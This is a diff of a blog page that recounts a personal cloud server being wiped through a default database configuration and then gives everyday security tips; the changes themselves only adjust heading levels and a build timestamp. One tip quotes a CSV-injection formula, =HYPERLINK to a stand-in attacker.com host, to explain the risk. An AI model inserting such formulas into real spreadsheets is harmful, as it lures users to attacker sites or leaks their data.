@@ -343,7 +343,7 @@ ga('send', 'pageview');
 <!-- <details>
   <summary>Hack incident details... (click to expand)</summary> -->
 
-<h1 id="Hack-incident"><a href="#Hack-incident" class="headerlink" title="Hack incident"></a>Hack incident</h1><p>I’ve been very chill about security most of my life. I’m 32, and I never got my social media hacked or emails. However, something that changed when I set up a personal server on the cloud and I got an intruder!</p>
+<h2 id="Hack-incident"><a href="#Hack-incident" class="headerlink" title="Hack incident"></a>Hack incident</h2><p>I’ve been very chill about security most of my life. I’m 32, and I never got my social media hacked or emails. However, something that changed when I set up a personal server on the cloud and I got an intruder!</p>
 <p>This server was collecting data from financial markets (just for fun and to play with some backtracking strategies). One day, I check the database as usual, and It was empty! I was in shock! What happened!? 👀</p>
 <p>I reviewed the authentication logs and found out thousands of attempts to log in to my server! 🤯 I saw efforts from everywhere: France, Rusia, Canada, Germany, China, and other countries! Fortunately, none of this got in. However, I still got hacked. How? 🤔</p>
 <p>It turns out that when I set up the database, I didn’t bother to change the default configuration. It wouldn’t do that for work but since it was a personal project and the data was public anyway, so I didn’t care too much. I also thought “Meh, nobody is going to find it. I don’t have this IP published anywhere”. However, I was wrong. People/bots did find it and tons of them!</p>
@@ -360,7 +360,7 @@ ga('send', 'pageview');
 </ul>
 <!-- </details> -->
 
-<h1 id="Security-Tips"><a href="#Security-Tips" class="headerlink" title="Security Tips"></a>Security Tips</h1><p>Cybercriminals are real, and everything that you have connected to the Internet is their target. No company or person can 100% prevent getting hacked. However, you can make it way more difficult and reduce the chances to 1 in 1000 years, which is pretty good.</p>
+<h2 id="Security-Tips"><a href="#Security-Tips" class="headerlink" title="Security Tips"></a>Security Tips</h2><p>Cybercriminals are real, and everything that you have connected to the Internet is their target. No company or person can 100% prevent getting hacked. However, you can make it way more difficult and reduce the chances to 1 in 1000 years, which is pretty good.</p>
 <p>For instance, your password length and unique character alone can tell how long it would take to break it:</p>
 <ul>
 <li>If your password is <code>Password</code> takes around 0.29 seconds to break.</li>
@@ -369,7 +369,7 @@ ga('send', 'pageview');
 <li>This password <code>P@ssw0rd123456!!</code> would take more than hundreds of thousand years to decipher.</li>
 </ul>
 <p>Here are my security tips on how to minimize hacking. It goes from generic usable for mostly everyone to server setup recommendations.</p>
-<h2 id="Generic-tips"><a href="#Generic-tips" class="headerlink" title="Generic tips"></a>Generic tips</h2><ul>
+<h3 id="Generic-tips"><a href="#Generic-tips" class="headerlink" title="Generic tips"></a>Generic tips</h3><ul>
 <li>Use different passwords for everything. If you use the same password for everything some website gets compromised (e.g., Amazon), then everything that has the same user and password will be at risk. I know it’s a hassle to remember all, but you don’t have to. Use a password manager like Bitwarden, 1Password, LastPass, Dashlane or even Google Chrome built-in password manager.</li>
 <li>Use long passwords with special characters. If you are using a password manager, you can ask to auto-generate a secure password.</li>
 <li>Use ** 2-factor authentication** whenever is available.</li>
@@ -378,20 +378,20 @@ ga('send', 'pageview');
 <li>Don’t trust defaults blindly verify if there’s a more secure option.</li>
 <li>Keep all your devices, operating systems and dependencies up-to-date. Most well-known vulnerabilities are fixed shortly after they are reported.</li>
 </ul>
-<h2 id="Email-security-tips"><a href="#Email-security-tips" class="headerlink" title="Email security tips"></a>Email security tips</h2><ul>
+<h3 id="Email-security-tips"><a href="#Email-security-tips" class="headerlink" title="Email security tips"></a>Email security tips</h3><ul>
 <li>Have ** 2-factor authentication** on your emails. If someone gets access to your primary email, then they can use <code>forgot password</code> on many sites (Evernote, Bank Accounts) and change the password. I heard of somebody that got their email compromised; in turn, the hacker got access to their Evernote and found some passwords to their cryptocurrency exchanges and got robbed big time. Don’t be that guy. Enable 2FA.</li>
 <li>Be aware of phishing emails. No, Bill Gates won’t share his fortune and donate you a million, nor you won any lottery. Don’t trust any email saying that you won money or any price. Also, be aware of fake company emails asking for you to log in somewhere. The site might look very similar, but it’s a trap! They want to capture your password. Check the domain carefully or even better yet don’t click on any link from the email and type your company web address directly as you usually do.</li>
 <li>Be aware of malicious attachments. Specially executables (*.exe, *.bat, *.sh, *.zip). See also Microsoft documents part. Everything that can run arbitrary code on your computer should not be trusted.</li>
 </ul>
-<h2 id="Social-Media"><a href="#Social-Media" class="headerlink" title="Social Media"></a>Social Media</h2><ul>
+<h3 id="Social-Media"><a href="#Social-Media" class="headerlink" title="Social Media"></a>Social Media</h3><ul>
 <li>Enable all the security options they have like 2 Factor authentication, SMS confirmation.</li>
 <li>Don’t share passwords with your friends or change them afterwards.</li>
 </ul>
-<h2 id="Microsoft-Documents"><a href="#Microsoft-Documents" class="headerlink" title="Microsoft Documents"></a>Microsoft Documents</h2><ul>
+<h3 id="Microsoft-Documents"><a href="#Microsoft-Documents" class="headerlink" title="Microsoft Documents"></a>Microsoft Documents</h3><ul>
 <li>If you use your documents locally or by trusted peers, you shouldn’t have many problems. However, for auto-generated documents like (*.csv) that you download from emails or compromised websites they can change data or insert malicious links (<code>=HYPERLINK(&quot;[http://attacker.com?some=&#39;data](http://attacker.com/?some=%27data%27)&#39;)</code>) and take you to their websites.</li>
 <li>Be aware of macros. They are code that automatically runs when you open the program. In modern versions, Office alerts you when a doc has a macro, and now they are disabled by default.</li>
 </ul>
-<h2 id="Wifi-security-tips"><a href="#Wifi-security-tips" class="headerlink" title="Wifi security tips"></a>Wifi security tips</h2><ul>
+<h3 id="Wifi-security-tips"><a href="#Wifi-security-tips" class="headerlink" title="Wifi security tips"></a>Wifi security tips</h3><ul>
 <li>Use a password for your wifi. If you leave it open anybody connects to it can have access to your computers, cell phones, tablets, and smart fridge or cameras.</li>
 <li>Use strong encryption for Wifi. Don’t use WEP encryption. Use  WPA or the newer WPA2. WEP can be cracked relatively quickly using some programs.</li>
 <li>Use a strong password. It makes it harder to break.</li>
@@ -404,7 +404,7 @@ ga('send', 'pageview');
 </ul>
 </li>
 </ul>
-<h2 id="Developers-security-tips"><a href="#Developers-security-tips" class="headerlink" title="Developers security tips"></a>Developers security tips</h2><ul>
+<h3 id="Developers-security-tips"><a href="#Developers-security-tips" class="headerlink" title="Developers security tips"></a>Developers security tips</h3><ul>
 <li>Keep all your operating systems and dependencies up-to-date. Maintainers usually patch their software after vulnerabilities come to light.</li>
 <li>Use latest encryption protocols TLS (rather than older SSL versions)<ul>
 <li>Use SFTP instead of FTP</li>
@@ -624,7 +624,7 @@ ga('send', 'pageview');
           
             <h3 class="toc-title">Contents</h3>
             <div>
-              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hack-incident"><span class="toc-number">1.</span> <span class="toc-text">Hack incident</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Tips"><span class="toc-number">2.</span> <span class="toc-text">Security Tips</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Generic-tips"><span class="toc-number">2.1.</span> <span class="toc-text">Generic tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Email-security-tips"><span class="toc-number">2.2.</span> <span class="toc-text">Email security tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Social-Media"><span class="toc-number">2.3.</span> <span class="toc-text">Social Media</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Microsoft-Documents"><span class="toc-number">2.4.</span> <span class="toc-text">Microsoft Documents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wifi-security-tips"><span class="toc-number">2.5.</span> <span class="toc-text">Wifi security tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Developers-security-tips"><span class="toc-number">2.6.</span> <span class="toc-text">Developers security tips</span></a></li></ol></li></ol>
+              <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hack-incident"><span class="toc-number">1.</span> <span class="toc-text">Hack incident</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Security-Tips"><span class="toc-number">2.</span> <span class="toc-text">Security Tips</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Generic-tips"><span class="toc-number">2.1.</span> <span class="toc-text">Generic tips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Email-security-tips"><span class="toc-number">2.2.</span> <span class="toc-text">Email security tips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Social-Media"><span class="toc-number">2.3.</span> <span class="toc-text">Social Media</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Microsoft-Documents"><span class="toc-number">2.4.</span> <span class="toc-text">Microsoft Documents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wifi-security-tips"><span class="toc-number">2.5.</span> <span class="toc-text">Wifi security tips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Developers-security-tips"><span class="toc-number">2.6.</span> <span class="toc-text">Developers security tips</span></a></li></ol></li></ol>
             </div>
 
             <!-- 300x600 -->
@@ -681,8 +681,8 @@ ga('send', 'pageview');
       <div class="container">
         <div class="p-y-2">
           &copy; 2020 <a href="http://adrianmejia.com">Adrian Mejia</a>
-          <span class="muted m-x-4" title="Mon Aug 31 2020 16:22:15 GMT-0400 (Eastern Daylight Time)">
-            v.qfy393
+          <span class="muted m-x-4" title="Mon Aug 31 2020 17:01:13 GMT-0400 (Eastern Daylight Time)">
+            v.qfy521
           </span>
         </div>
       </div>
